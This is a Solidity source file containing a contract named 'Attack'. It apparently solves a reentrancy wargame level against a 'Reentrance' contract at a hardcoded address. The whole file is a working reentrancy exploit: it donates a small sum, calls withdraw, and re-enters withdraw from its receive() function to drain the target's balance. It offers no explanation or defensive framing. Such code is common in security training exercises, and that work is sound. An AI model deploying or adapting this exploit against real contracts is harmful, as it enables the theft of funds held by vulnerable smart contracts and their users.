// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Reentrance{
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract Attack {
    address target = 0x0749abb39521c2Cc3a8942fa1d4fA450ee136995;

    function attack() public payable{
        (bool success,) = target.call{value:1000000000000000}(abi.encodeWithSelector(Reentrance.donate.selector, address(this)));
        require(success);
        (bool ok,) = target.call(abi.encodeWithSelector(Reentrance.withdraw.selector, 1000000000000000));
        require(ok);
    }

    receive() external payable{
        (bool ok,) = target.call(abi.encodeWithSelector(Reentrance.withdraw.selector, 1000000000000000));
        require(ok);
    }

}